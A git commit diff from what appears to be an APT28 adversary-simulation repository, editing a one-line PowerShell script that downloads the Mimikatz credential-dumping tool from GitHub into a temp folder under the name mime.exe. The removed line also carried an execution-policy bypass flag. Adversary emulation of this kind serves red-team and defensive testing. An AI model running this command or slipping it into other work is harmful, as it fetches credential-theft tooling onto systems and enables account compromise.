7cd2d91587e5ae431c1f1c54548d08981f2f3ace
Greycel <greycel@users.noreply.github.com>
2020-06-12 16:53:44 +0530

    Update DownloadKats.ps1

--- APT28/T1075/DownloadKats.ps1
+++ APT28/T1075/DownloadKats.ps1
@@ -1,2 +1,2 @@
--ep bypass [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;(New-Object Net.WebClient).Downloadfile("https://github.com/greycel/APT-Simulation/blob/master/Utilities/mimikatz.exe","$env:temp\APT28\mime.exe")
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;(New-Object Net.WebClient).Downloadfile("https://github.com/greycel/APT-Simulation/blob/master/Utilities/mimikatz.exe","$env:temp\APT28\mime.exe")
 
